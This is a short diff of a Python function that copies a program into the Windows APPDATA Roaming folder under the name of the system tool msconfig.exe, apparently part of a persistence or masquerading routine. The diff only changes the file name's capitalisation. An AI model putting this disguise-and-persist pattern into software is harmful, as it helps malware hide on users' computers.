@@ -13,7 +13,7 @@ from winreg import (
 
 def copy_to_roaming():
     roaming_path = getenv("APPDATA")
-    new_path = path.join(roaming_path, "MsConfig.exe")
+    new_path = path.join(roaming_path, "msconfig.exe")
 
     if not path.exists(new_path):
         try:
